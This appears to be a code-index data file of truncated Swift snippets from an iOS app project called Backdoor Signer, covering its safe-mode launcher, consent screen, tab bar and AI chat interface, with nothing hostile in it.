2113,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift","/ Mark the launch as successful, resetting the launch attempts counter","func markLaunchSuccessful() {
launchSuccessMarked = true

// Reset counter after successful launch with a delay to ensure stability
DispatchQueue.main.asyncAfter(deadline: .now() + 5.0) { [weak self] in"
2114,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift","/ Enable safe mode - limiting functionality to ensure stability","func enableSafeMode() {
UserDefaults.standard.set(true, forKey: safeModeFlagKey)

// Disable potentially problematic features
UserDefaults.standard.set(false, forKey: ""AILearningEnabled"")
UserDefaults.standard.set(false, forKey: ""AIServerSyncEnabled"")
UserDefaults.standard.synchronize()

print(""⚠️ SAFE MODE ENABLED - Limited functionality"")
}"
2115,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift","/ Disable safe mode and reset launch attempts","func disableSafeMode() {
// Reset all relevant UserDefaults to ensure a clean state
UserDefaults.standard.set(false, forKey: safeModeFlagKey)
UserDefaults.standard.set(0, forKey: launchAttemptsKey)

// Reset the selected tab to home to avoid potential issues
UserDefaults.standard.set(""home"", forKey: ""selectedTab"")

// Clear any cached data that might be causing issues
clearProblemCaches()"
2116,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift","/ Clear caches that might be causing crashes","private func clearProblemCaches() {
// Clear image cache
try? FileManager.default.removeItem(at: FileManager.default.temporaryDirectory.appendingPathComponent(""com.backdoor.imagecache""))

// Reset any problematic flags
UserDefaults.standard.set(false, forKey: ""isShowingStartupPopup"")
UserDefaults.standard.set(false, forKey: ""HasShownStartupPopup"")

// Reset any animation flags
UserDefaults.standard.set(false, forKey: ""animateIcon"")"
2117,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift","/ Present a safe mode alert to inform the user","func showSafeModeAlert(on viewController: UIViewController, completion: (() -> Void)? = nil) {
let alert = UIAlertController(
title: ""Safe Mode Activated"",
message: ""The app has been started in safe mode due to previous crashes. Advanced features are disabled for stability."",
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""Continue"", style: .default) { _ in"
2118,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift","/ Prompt the user to restart the app after exiting safe mode","private func promptForAppRestart(on viewController: UIViewController) {
let alert = UIAlertController(
title: ""Restart Required"",
message: ""The app needs to restart to exit safe mode. Do you want to restart now?"",
preferredStyle: .alert
)

alert.addAction(UIAlertAction(title: ""Restart Now"", style: .destructive) { [weak self] _ in"
2119,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","protocol ConsentViewControllerDelegate - implements functionality related to consent view controller delegate","protocol ConsentViewControllerDelegate: AnyObject {
func userDidAcceptConsent()
func userDidDeclineConsent()
}

class ConsentViewController: UIViewController {"
2120,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","Function userDidAcceptConsent - implements userdidacceptconsent functionality","func userDidAcceptConsent()
func userDidDeclineConsent()
}

class ConsentViewController: UIViewController {"
2121,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","Function userDidDeclineConsent - implements userdiddeclineconsent functionality","func userDidDeclineConsent()
}

class ConsentViewController: UIViewController {"
2122,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","class ConsentViewController - Controls user interface and application flow","class ConsentViewController: UIViewController {
// MARK: - Properties

weak var delegate: ConsentViewControllerDelegate?

private let scrollView = UIScrollView()
private let containerView = UIView()
private let titleLabel = UILabel()
private let iconImageView = UIImageView()
private let consentTextView = UITextView()"
2123,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupUI()
}

// MARK: - Setup

private func setupUI() {"
2124,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","MARK: - Setup","private func setupUI() {
view.backgroundColor = UIColor.systemBackground

// Configure scroll view
scrollView.translatesAutoresizingMaskIntoConstraints = false
containerView.translatesAutoresizingMaskIntoConstraints = false
view.addSubview(scrollView)
scrollView.addSubview(containerView)

// Configure icon"
2125,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","MARK: - Actions","@objc private func togglePrivacyConsent() {
isPrivacyAccepted.toggle()

if isPrivacyAccepted {"
2126,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","Function acceptButtonTapped - implements acceptbuttontapped functionality","@objc private func acceptButtonTapped() {
// Save consent to UserDefaults
UserDefaults.standard.set(true, forKey: ""UserHasAcceptedDataCollection"")
UserDefaults.standard.set(Date(), forKey: ""UserConsentDate"")

// Notify delegate
delegate?.userDidAcceptConsent()

// Dismiss
dismiss(animated: true)"
2127,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","Function declineButtonTapped - implements declinebuttontapped functionality","@objc private func declineButtonTapped() {
// Save declined consent
UserDefaults.standard.set(false, forKey: ""UserHasAcceptedDataCollection"")

// Notify delegate
delegate?.userDidDeclineConsent()

// Dismiss
dismiss(animated: true)
}"
2128,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/ConsentViewController.swift","MARK: - Helper Methods","private func getConsentText() -> String {
return """"""
DATA COLLECTION POLICY

At Backdoor Signer, we're committed to providing you with a seamless and personalized experience while continuously improving our services. To do that, we collect and process certain information in a secure and responsible manner. Here's what we gather, why we need it, and how it helps us serve you better:

1. HOW YOU USE THE APP

We track some details about your app experience to make it smoother and more tailored to you, such as:
"
2129,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","/ Extension to define notification names for tab-related events","extension Notification.Name {
static let tabDidChange = Notification.Name(""tabDidChange"")
static let changeTab = Notification.Name(""changeTab"")
}

/// Main TabView providing navigation between app sections with enhanced appearance
struct TabbarView: View {"
2130,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","/ Main TabView providing navigation between app sections with enhanced appearance","struct TabbarView: View {
// State for the selected tab, initialized from UserDefaults
@State private var selectedTab: Tab = .init(rawValue: UserDefaults.standard
.string(forKey: ""selectedTab"") ?? ""home"") ?? .home

// Track if a programmatic tab change is in progress to avoid notification loops
@State private var isProgrammaticTabChange = false

// Animation states for enhanced transitions
@State private var animateIcon = false"
2131,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Tab identifiers with enhanced visual properties","enum Tab: String, CaseIterable, Identifiable {
case home
case sources
case library
case ai
case settings
case bdgHub

var id: String { rawValue }"
2132,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Handle tab change notification from other parts of the app with enhanced animations","private func handleTabChangeNotification(_ notification: Notification) {
if let newTab = notification.userInfo?[""tab""] as? String,
let tab = Tab(rawValue: newTab)
{"
2133,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Search for tab bars in the view hierarchy with proper safety checks","func findAllTabBars(in view: UIView?) -> [UITabBar] {
guard let view = view else { return [] }"
2134,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Function tabView - implements tabview functionality","private func tabView(for tab: Tab) -> some View {
switch tab {"
2135,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Function createTab - creates tab","private func createTab<T: UIViewController>(
viewController: T.Type,
title: String,
imageName: String,
selectedImageName: String? = nil,
color: Color,
isSelected: Bool
) -> some View {"
2136,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","/ SwiftUI wrapper for UIKit view controllers with improved lifecycle management","struct NavigationViewController<Content: UIViewController>: UIViewControllerRepresentable {
let content: Content.Type
let title: String
let tintColor: UIColor

// Coordinator to maintain controller references and prevent premature deallocations
class Coordinator {"
2137,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Coordinator to maintain controller references and prevent premature deallocations","class Coordinator {
var viewController: UIViewController?
}

init(_ content: Content.Type, title: String, tintColor: UIColor = .systemBlue) {"
2138,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Function makeCoordinator - implements makecoordinator functionality","func makeCoordinator() -> Coordinator {
return Coordinator()
}

func makeUIViewController(context: Context) -> UINavigationController {"
2139,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Function makeUIViewController - implements makeuiviewcontroller functionality","func makeUIViewController(context: Context) -> UINavigationController {
// Create view controller
let viewController = content.init()
context.coordinator.viewController = viewController

// Configure view controller with improved styling
viewController.navigationItem.title = title

// Apply modern appearance
viewController.view.backgroundColor = .systemBackground"
2140,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Function updateUIViewController - updates uiviewcontroller","func updateUIViewController(_ uiViewController: UINavigationController, context _: Context) {
// Ensure the view controller remains responsive
uiViewController.view.isUserInteractionEnabled = true

// Update navigation bar tint color
uiViewController.navigationBar.tintColor = tintColor

// Update top view controller's properties if needed
if let topVC = uiViewController.topViewController {"
2141,swift,iOS,protocol,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","/ Protocol for view controllers that can refresh their content during tab switches","protocol ViewControllerRefreshable {
func refreshContent()
}

/// Default implementation for all UIViewControllers
extension UIViewController: ViewControllerRefreshable {"
2142,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Function refreshContent - implements refreshcontent functionality","func refreshContent()
}

/// Default implementation for all UIViewControllers
extension UIViewController: ViewControllerRefreshable {"
2143,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","/ Default implementation for all UIViewControllers","extension UIViewController: ViewControllerRefreshable {
@objc func refreshContent() {"
2144,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/TabbarView.swift","Function refreshContent - implements refreshcontent functionality","@objc func refreshContent() {
// Default implementation does nothing
// Subclasses can override this to refresh their content when tabs switch
}
}
"
2145,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift","MARK: - AIMessageCell","class AIMessageCell: UITableViewCell {
// MARK: - Properties

private let bubbleView = UIView()
private let messageLabel = UILabel()

private enum Constants {"
2146,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift","enum Constants - implements functionality related to constants","private enum Constants {
static let cornerRadius: CGFloat = 16
static let fontSize: CGFloat = 16

static let bubblePadding: CGFloat = 12
static let bubbleTopBottomPadding: CGFloat = 6
static let bubbleMaxWidth: CGFloat = 280

static let messagePadding: CGFloat = 12
static let messageTopBottomPadding: CGFloat = 8"
2147,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift","MARK: - View Configuration","private func configureViews() {
configureCellAppearance()
configureBubbleView()
configureMessageLabel()
setupConstraints()
}

private func configureCellAppearance() {"
2148,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift","Function configureCellAppearance - implements configurecellappearance functionality","private func configureCellAppearance() {
selectionStyle = .none
backgroundColor = .clear
}

private func configureBubbleView() {"
2149,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift","Function configureBubbleView - implements configurebubbleview functionality","private func configureBubbleView() {
bubbleView.backgroundColor = .systemGray5
bubbleView.layer.cornerRadius = Constants.cornerRadius
bubbleView.layer.maskedCorners = [
.layerMaxXMinYCorner,
.layerMaxXMaxYCorner,
.layerMinXMaxYCorner,
]

bubbleView.translatesAutoresizingMaskIntoConstraints = false"
2150,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift","Function configureMessageLabel - implements configuremessagelabel functionality","private func configureMessageLabel() {
messageLabel.numberOfLines = 0
messageLabel.textColor = .label
messageLabel.font = .systemFont(ofSize: Constants.fontSize)

messageLabel.translatesAutoresizingMaskIntoConstraints = false
bubbleView.addSubview(messageLabel)
}

private func setupConstraints() {"
2151,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
// Bubble view constraints
bubbleView.leadingAnchor.constraint(
equalTo: contentView.leadingAnchor,
constant: Constants.bubblePadding
),
bubbleView.topAnchor.constraint(
equalTo: contentView.topAnchor,
constant: Constants.bubbleTopBottomPadding"
2152,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/AIMessageCell.swift","MARK: - Configuration","func configure(with message: ChatMessage) {
messageLabel.text = message.content
}
}
"
2153,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","MARK: - SystemMessageCell","class SystemMessageCell: UITableViewCell {
// MARK: - Properties

private let messageLabel = UILabel()
private let containerView = UIView()
private var animationImageView: UIImageView?

private enum Constants {"
2154,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","enum Constants - implements functionality related to constants","private enum Constants {
static let cellPadding: CGFloat = 3
static let labelPadding: CGFloat = 12
static let iconSize: CGFloat = 20
static let iconSpacing: CGFloat = 4
static let cornerRadius: CGFloat = 10
static let fontSize: CGFloat = 14
static let animationDuration: TimeInterval = 0.5
static let animationScale: CGFloat = 1.2
}"
2155,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","MARK: - View Configuration","private func configureViews() {
selectionStyle = .none
backgroundColor = .clear

configureContainerView()
configureMessageLabel()
setupConstraints()
}

private func configureContainerView() {"
2156,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","Function configureContainerView - implements configurecontainerview functionality","private func configureContainerView() {
containerView.backgroundColor = .clear
containerView.translatesAutoresizingMaskIntoConstraints = false
contentView.addSubview(containerView)
}

private func configureMessageLabel() {"
2157,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","Function configureMessageLabel - implements configuremessagelabel functionality","private func configureMessageLabel() {
messageLabel.numberOfLines = 0
messageLabel.textColor = .systemGray
messageLabel.font = .systemFont(ofSize: Constants.fontSize, weight: .medium)
messageLabel.textAlignment = .center
messageLabel.translatesAutoresizingMaskIntoConstraints = false
containerView.addSubview(messageLabel)
}

private func setupConstraints() {"
2158,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
// Container view constraints
containerView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor),
containerView.trailingAnchor.constraint(equalTo: contentView.trailingAnchor),
containerView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: Constants.cellPadding),
containerView.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -Constants.cellPadding),

// Message label constraints
messageLabel.centerXAnchor.constraint(equalTo: containerView.centerXAnchor),"
2159,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","MARK: - Message Configuration","func configure(with message: ChatMessage) {
// Clear any existing animation
clearAnimation()

// Process the message content
let content = message.content ?? """"

// Handle different system message types with specialized styling
if content.contains(""error"") || content.contains(""failed"") || content.contains(""Error:"") {"
2160,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","Function configureErrorMessage - implements configureerrormessage functionality","private func configureErrorMessage(_ content: String) {
messageLabel.textColor = .systemRed
messageLabel.text = content
addIconAnimation(iconName: ""exclamationmark.triangle.fill"", tintColor: .systemRed)
}

private func configureSuccessMessage(_ content: String) {"
2161,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","Function configureSuccessMessage - implements configuresuccessmessage functionality","private func configureSuccessMessage(_ content: String) {
messageLabel.textColor = .systemGreen
messageLabel.text = content
addIconAnimation(iconName: ""checkmark.circle.fill"", tintColor: .systemGreen)
}

private func configureThinkingMessage(_ content: String) {"
2162,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","Function configureThinkingMessage - implements configurethinkingmessage functionality","private func configureThinkingMessage(_ content: String) {
messageLabel.textColor = .systemGray
messageLabel.text = content
}

private func configureDefaultMessage(_ content: String) {"
2163,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","Function configureDefaultMessage - implements configuredefaultmessage functionality","private func configureDefaultMessage(_ content: String) {
messageLabel.textColor = .systemGray
messageLabel.text = content
}

// MARK: - Animation

private func addIconAnimation(iconName: String, tintColor: UIColor) {"
2164,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","MARK: - Animation","private func addIconAnimation(iconName: String, tintColor: UIColor) {
// Create an image view with SF Symbol
let imageView = UIImageView()

if let image = UIImage(systemName: iconName) {"
2165,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","Function clearAnimation - implements clearanimation functionality","private func clearAnimation() {
// Remove animation view if exists
animationImageView?.layer.removeAllAnimations()
animationImageView?.removeFromSuperview()
animationImageView = nil
}

// MARK: - Cell Lifecycle

override func prepareForReuse() {"
2166,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/SystemMessageCell.swift","MARK: - Cell Lifecycle","override func prepareForReuse() {
super.prepareForReuse()
clearAnimation()
messageLabel.textColor = .systemGray
}
}
"
2167,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","MARK: - UserMessageCell","class UserMessageCell: UITableViewCell {
// MARK: - Properties

private let bubbleView = UIView()
private let messageLabel = UILabel()

private enum Constants {"
2168,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","enum Constants - implements functionality related to constants","private enum Constants {
static let cornerRadius: CGFloat = 16
static let fontSize: CGFloat = 16

static let bubblePadding: CGFloat = 12
static let bubbleTopBottomPadding: CGFloat = 6
static let bubbleMaxWidth: CGFloat = 280

static let messagePadding: CGFloat = 12
static let messageTopBottomPadding: CGFloat = 8"
2169,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","MARK: - View Configuration","private func configureViews() {
configureCellAppearance()
configureBubbleView()
configureMessageLabel()
setupConstraints()
}

private func configureCellAppearance() {"
2170,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","Function configureCellAppearance - implements configurecellappearance functionality","private func configureCellAppearance() {
selectionStyle = .none
backgroundColor = .clear
}

private func configureBubbleView() {"
2171,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","Function configureBubbleView - implements configurebubbleview functionality","private func configureBubbleView() {
// Configure bubble shape
bubbleView.layer.cornerRadius = Constants.cornerRadius
bubbleView.layer.maskedCorners = [
.layerMinXMinYCorner,
.layerMinXMaxYCorner,
.layerMaxXMinYCorner,
]

// Add gradient background"
2172,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","Function configureBubbleShadow - implements configurebubbleshadow functionality","private func configureBubbleShadow() {
bubbleView.layer.shadowColor = UIColor.black.withAlphaComponent(Constants.shadowAlpha).cgColor
bubbleView.layer.shadowOffset = Constants.shadowOffset
bubbleView.layer.shadowRadius = Constants.shadowRadius
bubbleView.layer.shadowOpacity = Constants.shadowOpacity
bubbleView.layer.masksToBounds = false
}

private func configureMessageLabel() {"
2173,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","Function configureMessageLabel - implements configuremessagelabel functionality","private func configureMessageLabel() {
messageLabel.numberOfLines = 0
messageLabel.textColor = .white
messageLabel.font = .systemFont(ofSize: Constants.fontSize)

messageLabel.translatesAutoresizingMaskIntoConstraints = false
bubbleView.addSubview(messageLabel)
}

private func setupConstraints() {"
2174,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
NSLayoutConstraint.activate([
// Bubble view constraints
bubbleView.trailingAnchor.constraint(
equalTo: contentView.trailingAnchor,
constant: -Constants.bubblePadding
),
bubbleView.topAnchor.constraint(
equalTo: contentView.topAnchor,
constant: Constants.bubbleTopBottomPadding"
2175,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","MARK: - Gradient Configuration","private func addGradientToBubble() {
let gradientLayer = CAGradientLayer()

// Configure gradient colors and direction
gradientLayer.colors = [
UIColor.systemBlue.cgColor,
UIColor(red: 0.1, green: 0.6, blue: 1.0, alpha: 1.0).cgColor,
]
gradientLayer.startPoint = CGPoint(x: 0, y: 0)
gradientLayer.endPoint = CGPoint(x: 1, y: 1)"
2176,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","MARK: - Layout","override func layoutSubviews() {
super.layoutSubviews()

// Update gradient frame when layout changes
if let gradientLayer = bubbleView.layer.sublayers?.first as? CAGradientLayer {"
2177,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Cells/UserMessageCell.swift","MARK: - Configuration","func configure(with message: ChatMessage) {
messageLabel.text = message.content
}
}
"
2178,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","class ChatViewController - Controls user interface and application flow","class ChatViewController: UIViewController, UITableViewDataSource, UITableViewDelegate,
UISheetPresentationControllerDelegate
{"
2179,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - Lifecycle","override func viewDidLoad() {
super.viewDidLoad()
setupUI()
loadMessages()

// Register for app background/foreground notifications
setupAppStateObservers()

// Add a welcome message if this is a new session
if messages.isEmpty {"
2180,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Set navigation bar appearance
if let navigationController = navigationController {"
2181,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function viewDidDisappear - implements viewdiddisappear functionality","override func viewDidDisappear(_ animated: Bool) {
super.viewDidDisappear(animated)

// If we're being dismissed (not just covered by another VC), call the dismissHandler
if isBeingDismissed || navigationController?.isBeingDismissed == true {"
2182,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - Welcome Message","private func addWelcomeMessage() {
do {"
2183,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - App State Handling","private func setupAppStateObservers() {
NotificationCenter.default.addObserver(
self,
selector: #selector(appDidEnterBackground),
name: UIApplication.didEnterBackgroundNotification,
object: nil
)

NotificationCenter.default.addObserver(
self,"
2184,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function appDidEnterBackground - implements appdidenterbackground functionality","@objc private func appDidEnterBackground() {
// Save any pending state when app goes to background
Debug.shared.log(message: ""Chat view controller saving state before background"", type: .debug)

// Cancel any ongoing message processing
if isProcessingMessage {"
2185,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function appWillEnterForeground - implements appwillenterforeground functionality","@objc private func appWillEnterForeground() {
// Refresh data when app comes to foreground
Debug.shared.log(message: ""Chat view controller becoming active after background"", type: .debug)

// Refresh messages to ensure we're in sync with CoreData
DispatchQueue.main.async(execute: { [weak self] in"
2186,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - UI Setup","private func setupUI() {
view.backgroundColor = .systemBackground

// Navigation bar
navigationItem.title = currentSession.title
navigationItem.leftBarButtonItem = UIBarButtonItem(
image: UIImage(systemName: ""clock.arrow.circlepath""),
style: .plain,
target: self,
action: #selector(showHistory)"
2187,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function setupTableView - sets uptableview","private func setupTableView() {
tableView.dataSource = self
tableView.delegate = self

// Register cell types
tableView.register(UserMessageCell.self, forCellReuseIdentifier: ""UserCell"")
tableView.register(AIMessageCell.self, forCellReuseIdentifier: ""AICell"")
tableView.register(SystemMessageCell.self, forCellReuseIdentifier: ""SystemCell"")

// Configure tableView appearance"
2188,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function setupEmptyStateView - sets upemptystateview","private func setupEmptyStateView() {
// Create an empty state view
let emptyView = UIView()
emptyView.isHidden = true
emptyView.backgroundColor = .clear

// Add animation for empty state using SF Symbol
let animationView = emptyView.addAnimatedIcon(
systemName: ""ellipsis.bubble"",
tintColor: .systemBlue,"
2189,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function refreshMessages - implements refreshmessages functionality","@objc private func refreshMessages() {
// Reload messages from database
loadMessages()

// End refreshing
tableView.refreshControl?.endRefreshing()
}

// Update UI when message processing state changes
private func updateProcessingState(isProcessing: Bool) {"
2190,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Update UI when message processing state changes","private func updateProcessingState(isProcessing: Bool) {
if isProcessing {"
2191,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function setupInputControls - sets upinputcontrols","private func setupInputControls() {
// Input container with enhanced styling
inputContainer.backgroundColor = .systemBackground
inputContainer.applyCardStyling(
cornerRadius: 12,
shadowOpacity: 0.15,
backgroundColor: .systemBackground
)
view.addSubview(inputContainer)
"
2192,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function setupConstraints - sets upconstraints","private func setupConstraints() {
// Enable autolayout
tableView.translatesAutoresizingMaskIntoConstraints = false
inputContainer.translatesAutoresizingMaskIntoConstraints = false
textField.translatesAutoresizingMaskIntoConstraints = false
sendButton.translatesAutoresizingMaskIntoConstraints = false
activityIndicator.translatesAutoresizingMaskIntoConstraints = false

// Safe area guide for proper layout
let safeArea = view.safeAreaLayoutGuide"
2193,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function setupKeyboardHandling - sets upkeyboardhandling","private func setupKeyboardHandling() {
// Add keyboard notifications
NotificationCenter.default.addObserver(
self,
selector: #selector(keyboardWillShow),
name: UIResponder.keyboardWillShowNotification,
object: nil
)

NotificationCenter.default.addObserver("
2194,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function dismissKeyboard - implements dismisskeyboard functionality","@objc private func dismissKeyboard() {
view.endEditing(true)
}

@objc private func keyboardWillShow(notification: NSNotification) {"
2195,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function keyboardWillShow - implements keyboardwillshow functionality","@objc private func keyboardWillShow(notification: NSNotification) {
guard let keyboardFrame = notification.userInfo?[UIResponder.keyboardFrameEndUserInfoKey] as? CGRect,
let duration = notification.userInfo?[UIResponder.keyboardAnimationDurationUserInfoKey] as? Double
else {"
2196,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function keyboardWillHide - implements keyboardwillhide functionality","@objc private func keyboardWillHide(notification: NSNotification) {
guard let duration = notification.userInfo?[UIResponder.keyboardAnimationDurationUserInfoKey] as? Double else {"
2197,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","MARK: - Data Loading","private func loadMessages() {
// Fetch messages from CoreData
let fetchedMessages = CoreDataManager.shared.getMessages(for: currentSession)

// Handle the case where no messages are found
if fetchedMessages.isEmpty && messages.isEmpty {"
2198,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/AI/Core/AI.swift","Function scrollToBottom - implements scrolltobottom functionality","private func scrollToBottom(animated: Bool = true) {
// Ensure we have messages and the table view is loaded
if !messages.isEmpty && tableView.window != nil {"
